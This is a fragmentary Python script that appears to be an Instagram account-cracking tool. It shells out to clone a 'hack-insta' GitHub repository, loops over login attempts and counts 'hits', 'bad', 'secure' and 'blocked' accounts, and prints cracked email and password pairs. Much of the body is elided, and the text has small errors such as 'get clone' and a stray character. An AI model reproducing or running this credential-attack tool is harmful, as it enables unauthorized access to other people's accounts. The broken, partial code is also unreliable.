os.system("rm nawy tool")
os.system("get clone https://github.com/ABDULACOD3R/hack-insta")c
import os
from time import sleep
os.system("title " + " Paris  Was Here - @revolutionary_linux")
...
if ask == "3":
    ...
    print("𝑰𝑵𝑺𝑻𝑨𝑮𝑹𝑨𝑴 𝑯𝑼𝑵𝑻𝑬𝑹✰✰\n====================\n ✪ 𝑬𝑴𝑨𝑰𝑳 : {user} \n ✪ 𝑷𝑨𝑺𝑺 : {pasw}\n ✪𝒔𝒄𝒓 : @revolutionary_linux\n====================\n𝑪𝑯 : @kurdsh_for_hacker")
    ...
    while True:
        ...
        if "logged_in_user" in r.text:
            ...
            b += 1
            print(f"\r                  [=Hack : {h} / Bad : {b} / Scure : {s} / Block : {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32;1m[=] Hit : {h} \033[0;1m/\033[31;1mBad : {b} \033[0;1m/\033[33;1mScure : {s} \033[0;1m/ Block : {block}",end='')
elif ask =="2":
